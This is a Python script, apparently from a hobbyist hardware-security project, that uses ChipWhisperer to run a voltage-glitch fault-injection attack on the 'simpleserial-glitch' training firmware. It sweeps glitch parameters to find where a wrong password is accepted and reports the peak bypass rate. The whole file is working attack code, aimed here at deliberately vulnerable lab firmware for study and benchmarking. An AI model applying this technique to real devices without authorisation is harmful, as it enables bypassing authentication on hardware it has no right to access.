#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Peak bypass rate of the high-power voltage-glitch password bypass, measured the same way on every
# bench setup so you can compare them. A fine width x offset x ext_offset sweep finds the best cell,
# then 40 attempts run there. The offset range is wide (2360 to 2520) so that the best cell is less
# likely to sit on a grid edge, where the rate comes out low. A bypass is the wrong password
# ([0]*5) accepted (passok=1) by simpleserial-glitch, whose password is "touch".
# Needs simpleserial-glitch already on the target (the script does not flash) and, on the UFO, the
# SMA tee at the UFO VOUT SMA.
# Usage: python vglitch_peakrate.py "<config label>"   The label is only printed.
# Prints one PEAKRATE line: the best cell, a warning if it is on a grid edge, the peak rate, the
# bypass count in the search and the top 5 cells.
import sys, time
from collections import Counter
import chipwhisperer as cw

LABEL = sys.argv[1] if len(sys.argv) > 1 else "config"
scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup(); scope.vglitch_setup('hp', default_setup=False)
scope.glitch.trigger_src="ext_single"; scope.adc.timeout=0.1

def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.05); target.flush()
WRONG=bytearray([0]*5)
def check(pw):
    reboot_flush(); target.simpleserial_write('p', pw)
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=1000)
    return v['payload'][0] if (v['valid'] and v['payload']) else None
# One glitched attempt: "success" is a bypass, "normal" a rejected password, "reset" a crash
# (capture timeout or no valid reply), after which the target is reset. A trigger still high
# (scope.adc.state) means the last attempt left the target hung.
def attempt(w,o,e):
    scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    if scope.adc.state: reboot_flush()
    scope.arm(); target.simpleserial_write('p', WRONG); ret=scope.capture(); scope.io.vglitch_reset()
    if ret: reboot_flush(); return "reset"
    v=target.simpleserial_read_witherrors('r',1,glitch_timeout=10,timeout=50)
    if not v['valid'] or v['payload'] is None: reboot_flush(); return "reset"
    return "success" if v['payload'][0]==1 else "normal"

# Glitch-free check: the wrong password returns 0 and "touch" (the bytes below) returns 1.
assert check(WRONG)==0 and check(bytearray([0x74,0x6F,0x75,0x63,0x68]))==1, "firmware sanity failed"
cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()

# Find the best cell: 9 widths x 17 offsets x 3 ext_offsets, two passes, 918 attempts. Width and
# offset are Husky phase-shift steps; ext_offset is target clock cycles after the trigger.
EXTS=[128,129,130]; WIDTHS=list(range(1800,2201,50)); OFFS=list(range(2360,2521,10))
cell=Counter()
for _ in range(2):
    for w in WIDTHS:
        for o in OFFS:
            for e in EXTS:
                if attempt(w,o,e)=="success": cell[(w,o,e)]+=1
# With no bypass in the search, best falls back to (2000, 2470, 129). edge flags a best cell on a
# width or offset edge of the grid, and the print then warns.
best=max(cell, key=cell.get) if cell else (2000,2470,129)
edge = best[0] in (WIDTHS[0],WIDTHS[-1]) or best[1] in (OFFS[0],OFFS[-1])

# Peak rate: 40 attempts at the best cell.
REPS=40; hit=sum(1 for _ in range(REPS) if attempt(*best)=="success")
cw.set_all_log_levels(cw.logging.WARNING)
scope.dis(); target.dis()

top=sorted(cell.items(), key=lambda x:-x[1])[:5]
print(f"PEAKRATE[{LABEL}]: best={best}{'  <-- AT GRID EDGE, widen ranges!' if edge else ''}, "
      f"peak={hit}/{REPS} ({100*hit/REPS:.0f}%), locate_hits={sum(cell.values())}, top={top}")
print("DONE")
